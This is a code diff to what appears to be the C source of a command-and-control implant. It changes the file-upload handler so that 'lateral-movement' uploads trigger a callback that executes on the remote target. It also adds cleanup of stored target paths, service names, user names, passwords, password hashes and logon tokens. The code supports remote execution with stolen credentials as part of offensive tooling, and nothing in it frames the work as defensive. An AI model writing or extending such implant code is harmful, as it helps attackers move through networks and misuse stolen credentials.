@@ -95,7 +95,24 @@ BOOL UploadSync(_In_ PCHAR TaskUuid, _Inout_ PPARSER Response)
             {
                 _dbg("Upload complete. %d / %d chunks", CurrentChunk, TotalChunks);
 
-                PackageComplete(Current->TaskUuid, NULL);
+                /* Close file before executing or reporting completion */
+                if (Current->hFile && Current->hFile != INVALID_HANDLE_VALUE)
+                {
+                    CloseHandle(Current->hFile);
+                    Current->hFile = INVALID_HANDLE_VALUE;
+                }
+
+                /* Lateral-movement uploads run a continuation callback instead
+                 * of immediately completing — the callback sends its own
+                 * PackageComplete / PackageError after executing on the target. */
+                if (Current->OnComplete)
+                {
+                    Current->OnComplete(Current->TaskUuid, Current);
+                }
+                else
+                {
+                    PackageComplete(Current->TaskUuid, NULL);
+                }
 
                 /* Unlink */
                 if (Prev)
@@ -227,14 +244,23 @@ VOID UploadFree(_In_ PFILE_UPLOAD File)
     if ( !File )
         return;
 
-    if ( File->hFile ) 
+    if ( File->hFile && File->hFile != INVALID_HANDLE_VALUE )
     {
         CloseHandle(File->hFile);
-        File->hFile = NULL;
+        File->hFile = INVALID_HANDLE_VALUE;
     }
 
+    /* Free lateral-movement context fields */
+    if (File->LmTarget)    { LocalFree(File->LmTarget);    File->LmTarget   = NULL; }
+    if (File->LmUncPath)   { LocalFree(File->LmUncPath);   File->LmUncPath  = NULL; }
+    if (File->LmExecPath)  { LocalFree(File->LmExecPath);  File->LmExecPath = NULL; }
+    if (File->LmSvcName)   { LocalFree(File->LmSvcName);   File->LmSvcName  = NULL; }
+    if (File->LmCredUser)  { LocalFree(File->LmCredUser);  File->LmCredUser = NULL; }
+    if (File->LmCredPass)  { LocalFree(File->LmCredPass);  File->LmCredPass = NULL; }
+    if (File->LmCredHash)  { LocalFree(File->LmCredHash);  File->LmCredHash = NULL; }
+    if (File->LmLogonToken) { CloseHandle(File->LmLogonToken); File->LmLogonToken = NULL; }
+
     LocalFree(File);
-    File = NULL;
 }
 
 
